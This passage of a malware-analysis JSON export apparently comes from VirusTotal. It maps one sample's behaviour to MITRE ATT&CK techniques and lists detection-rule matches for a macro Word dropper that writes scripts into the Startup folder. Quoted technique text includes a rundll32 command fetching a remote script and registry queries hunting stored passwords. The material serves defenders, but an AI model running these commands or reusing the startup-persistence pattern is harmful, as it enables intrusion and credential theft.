                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Contains capabilities to detect virtual machines"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              },
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the volume information (name, serial number etc) of a device"
                  },
                  {
                    "severity": "INFO",
                    "description": "Checks if Microsoft Office is installed"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Detected TCP or UDP traffic on non-standard ports"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1571/",
                "id": "T1571",
                "name": "Non-Standard Port"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May try to detect the Windows Explorer process (often used for injection)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading. Masquerading may also include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates files inside the system directory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1036/",
                "id": "T1036",
                "name": "Masquerading"
              },
              {
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Contains capabilities to detect virtual machines"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/",
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion"
              },
              {
                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}).\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. \nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"  This behavior has been seen used by malware such as Poweliks. \nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1).\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Runs a DLL by calling functions"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1218/011/",
                "id": "T1218.011",
                "name": "Rundll32"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "techniques": [
              {
                "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates a DirectInput object (often for capturing keystrokes)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1056/",
                "id": "T1056",
                "name": "Input Capture"
              },
              {
                "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Tries to harvest and steal browser information (history, passwords, etc)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1003/",
                "id": "T1003",
                "name": "OS Credential Dumping"
              },
              {
                "description": "Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\nExample commands to find Registry keys related to password information: \n\nLocal Machine Hive: reg query HKLM /f password /t REG_SZ /s\nCurrent User Hive: reg query HKCU /f password /t REG_SZ /s\n",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Tries to harvest and steal Putty information (sessions, passwords, etc)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1552/002/",
                "id": "T1552.002",
                "name": "Credentials in Registry"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0006/",
            "id": "TA0006",
            "name": "Credential Access"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May try to detect the Windows Explorer process (often used for injection)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      },
      "CAPA": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "access PEB ldr_data"
                  },
                  {
                    "severity": "INFO",
                    "description": "link function at runtime on Windows"
                  },
                  {
                    "severity": "INFO",
                    "description": "forwarded export"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1129/",
                "id": "T1129",
                "name": "Shared Modules"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "query environment variable"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get common file path"
                  },
                  {
                    "severity": "INFO",
                    "description": "enumerate files on Windows"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "reference anti-VM strings targeting VirtualBox"
                  },
                  {
                    "severity": "INFO",
                    "description": "reference anti-VM strings targeting VMWare"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/001/",
                "id": "T1497.001",
                "name": "System Checks"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "reference anti-VM strings targeting VirtualBox"
                  },
                  {
                    "severity": "INFO",
                    "description": "reference anti-VM strings targeting VMWare"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1497/001/",
                "id": "T1497.001",
                "name": "System Checks"
              },
              {
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "encrypt data using RC4 PRGA"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/",
                "id": "T1027",
                "name": "Obfuscated Files or Information"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/30fda67726f77706955f6b52b202452e91d5ff132783854eec63e809061a4b5c/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "6596a60006bafd61c48fcc5b"
  },
  "data": {
    "attributes": {
      "type_description": "Office Open XML Document",
      "tlsh": "T182152311C5B34DE7D239A172203968667669578B31107C2E81F2DBBCFFDB28A10D937A",
      "vhash": "b48d7077a3d01c28c575b12276f185ab",
      "type_tags": [
        "document",
        "msoffice",
        "text",
        "word",
        "docx"
      ],
      "crowdsourced_yara_results": [
        {
          "description": "This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.",
          "source": "https://github.com/InQuest/yara-rules-vt",
          "author": "InQuest Labs",
          "ruleset_name": "Office_Document_with_VBA_Project",
          "rule_name": "Office_Document_with_VBA_Project",
          "ruleset_id": "01234b2177"
        }
      ],
      "creation_date": 1700279040,
      "names": [
        "b5c001cbcd72b919e9b05e3281cc4e4914fee0748b3d81954772975630233a6e.docx",
        "e2a3edc708016316477228de885f0c39.docx",
        "e2a3edc708016316477228de885f0c39.docm"
      ],
      "last_modification_date": 1704355030,
      "type_tag": "docx",
      "times_submitted": 5,
      "total_votes": {
        "harmless": 1,
        "malicious": 2
      },
      "size": 878327,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.bomber/macros",
        "popular_threat_category": [
          {
            "count": 10,
            "value": "trojan"
          },
          {
            "count": 4,
            "value": "downloader"
          },
          {
            "count": 3,
            "value": "dropper"
          }
        ],
        "popular_threat_name": [
          {
            "count": 7,
            "value": "bomber"
          },
          {
            "count": 6,
            "value": "macros"
          },
          {
            "count": 3,
            "value": "valyria"
          }
        ]
      },
      "last_submission_date": 1701847129,
      "sigma_analysis_results": [
        {
          "rule_title": "Winword Drops Script In Startup",
          "rule_source": "Joe Security Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "11",
                "ProcessId": "6368",
                "TargetFilename": "C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OCu3HBg7gyI9aUaB.vbs",
                "RuleName": "T1023",
                "CreationUtcTime": "1700279473",
                "UtcTime": "1700279473",
                "ProcessGuid": "{C784477D-34AB-6558-4606-000000004800}",
                "Image": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE"
              }
            }
          ],
          "rule_level": "critical",
          "rule_id": "04a0af687c3b9094f9252dc38ead308fae7facf86cb7e4bf728075c9b17ed9dc",
          "rule_author": "Joe Security",
          "rule_description": "Winword.exe drops script file in startup location"
        },
        {
          "rule_title": "Drops script at startup location",
          "rule_source": "Joe Security Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "11",
                "ProcessId": "6368",
                "Image": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
                "ProcessGuid": "{C784477D-34AB-6558-4606-000000004800}",
                "CreationUtcTime": "1700279473",
                "UtcTime": "1700279473",
                "RuleName": "T1023",
                "TargetFilename": "C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OCu3HBg7gyI9aUaB.vbs"
              }
            }
          ],
          "rule_level": "critical",
          "rule_id": "196a9c9222e3b003ccb0caadc29931d851129ba863f99545299786a032864d12",
          "rule_author": "Joe Security",
          "rule_description": "Drops script at startup location"
        },
        {
          "rule_title": "Office product drops script at suspicious location",
          "rule_source": "Joe Security Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "11",
                "ProcessId": "6368",
                "Image": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
                "ProcessGuid": "{C784477D-34AB-6558-4606-000000004800}",
                "CreationUtcTime": "1700279473",
                "UtcTime": "1700279473",
                "RuleName": "T1023",
                "TargetFilename": "C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OCu3HBg7gyI9aUaB.vbs"
              }
            }
          ],
          "rule_level": "critical",
          "rule_id": "67124e7349285a993dc331738db576ef56c6cb9724bf1cea7695561498a0fb35",
          "rule_author": "Joe Security",
          "rule_description": "Office product drops script at suspicious location"
        },
        {
          "rule_title": "WScript or CScript Dropper",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-34BD-6558-4906-000000004800}",
                "ProcessId": "3484",
                "Product": "Microsoft \\xae Windows Script Host",
                "Description": "Microsoft \\xae Windows Based Script Host",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-4C32-6536-6600-000000004800}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD",
                "OriginalFileName": "wscript.exe",
                "ParentImage": "C:\\Windows\\explorer.exe",
                "FileVersion": "5.812.10240.16384",
                "ParentProcessId": "4716",
                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
                "CommandLine": "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OCu3HBg7gyI9aUaB.vbs\" ",
                "EventID": "1",
                "LogonGuid": "C784477D-4C31-6536-5243-030000000000",
                "LogonId": "213842",
                "Image": "C:\\Windows\\System32\\wscript.exe",
                "IntegrityLevel": "Medium",
                "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
                "UtcTime": "1700279485",
                "RuleName": "-"
              }
            }
          ],
          "rule_level": "high",
          "rule_id": "2020feadc9b3cf47558c219948361d9d3eb5347af91135f21bf711f6032bc817",
          "rule_author": "Margaritis Dimitrios (idea), Florian Roth (Nextron Systems), oscd.community",
          "rule_description": "Detects wscript/cscript executions of scripts located in user directories"
        },
        {
          "rule_title": "Suspicious Startup Folder Persistence",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "11",
                "ProcessId": "6368",
                "TargetFilename": "C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OCu3HBg7gyI9aUaB.vbs",
                "RuleName": "T1023",
                "CreationUtcTime": "1700279473",
                "UtcTime": "1700279473",
                "ProcessGuid": "{C784477D-34AB-6558-4606-000000004800}",
                "Image": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE"
              }
            },
            {
              "values": {
                "EventID": "0",
                "TargetFilename": "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OCu3HBg7gyI9aUaB.vbs"
              }
            },
            {
              "values": {
                "EventID": "0",
                "TargetFilename": "c:\\users\\rdhj0cnfevzx\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup\\ocu3hbg7gyi9auab.vbs"
              }
            }
          ],
          "rule_level": "high",
          "rule_id": "3396956bf20db86e217299b41f051d8e3807a72f92450b595e46cc0a7e70800b",
          "rule_author": "Nasreddine Bencherchali (Nextron Systems)",
          "rule_description": "Detects when a file with a suspicious extension is created in the startup folder"
        },
        {
          "rule_title": "File With Uncommon Extension Created By An Office Application",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "11",
                "ProcessId": "6368",
                "Image": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
                "ProcessGuid": "{C784477D-34AB-6558-4606-000000004800}",
                "CreationUtcTime": "1700279473",
                "UtcTime": "1700279473",
                "RuleName": "T1023",
                "TargetFilename": "C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OCu3HBg7gyI9aUaB.vbs"
              }
            },
            {
              "values": {
                "EventID": "11",
                "ProcessId": "6368",
                "TargetFilename": "C:\\Users\\george\\AppData\\Local\\skriven.vbs",
                "ProcessGuid": "{C784477D-34AB-6558-4606-000000004800}",
                "CreationUtcTime": "1700279473",
                "UtcTime": "1700279473",
                "RuleName": "-",
                "Image": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE"
              }
            },
            {
              "values": {
                "EventID": "11",
                "ProcessId": "6368",
                "TargetFilename": "C:\\Users\\george\\AppData\\Local\\8lGghf8kIPIuu3cM.bat",
                "ProcessGuid": "{C784477D-34AB-6558-4606-000000004800}",
                "CreationUtcTime": "1700279473",
                "UtcTime": "1700279473",
                "RuleName": "-",
                "Image": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE"
              }
            }
          ],
          "rule_level": "high",
          "rule_id": "5c100e376f43b26c0279b6ecab437d35499a64f73cd9c1b180f62e840eebd2a6",
          "rule_author": "Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule), Nasreddine Bencherchali (Nextron Systems)",
          "rule_description": "Detects the creation of files with an executable or script extension by an Office application."
        },
        {
          "rule_title": "Startup Folder File Write",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "11",
                "ProcessId": "6368",
                "TargetFilename": "C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OCu3HBg7gyI9aUaB.vbs",
                "ProcessGuid": "{C784477D-34AB-6558-4606-000000004800}",
                "CreationUtcTime": "1700279473",
                "UtcTime": "1700279473",
                "RuleName": "T1023",
                "Image": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE"
              }
            },
            {
              "values": {
                "EventID": "0",
                "TargetFilename": "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OCu3HBg7gyI9aUaB.vbs"
              }
            },
            {
              "values": {
                "EventID": "0",
                "TargetFilename": "c:\\users\\rdhj0cnfevzx\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup\\ocu3hbg7gyi9auab.vbs"
              }
            }
          ],
          "rule_level": "medium",
          "rule_id": "56b8c79acb8e444c2b00be5c9d3cb8e33e863ccb3506d635f907a49cd053c84f",
          "rule_author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)",
          "rule_description": "A General detection for files being created in the Windows startup directory. This could be an indicator of persistence."
        },
        {
          "rule_title": "WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-34BD-6558-4906-000000004800}",
